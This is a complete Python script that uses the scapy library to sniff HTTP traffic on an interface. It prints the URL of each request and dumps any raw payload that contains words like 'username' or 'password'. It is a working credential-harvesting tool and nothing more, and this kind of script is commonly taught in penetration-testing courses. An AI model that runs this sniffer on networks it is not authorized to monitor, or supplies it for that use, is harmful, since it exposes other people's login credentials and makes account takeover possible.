#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    # Extract and construct the full URL from the HTTP request
    return packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load.decode(errors="ignore")  # Decode raw data
        keywords = ["username", "login", "password", "user", "passwd"]
        for keyword in keywords:
            if keyword in load:
                return load
    return None

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        # Extract URL and print it
        url = get_url(packet)
        print("[+] HTTP Request >>>> " + str(url))

        # Check for potential login information
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password >>>> " + login_info + "\n\n")

# Start sniffing on the specified interface
sniff("eth0")
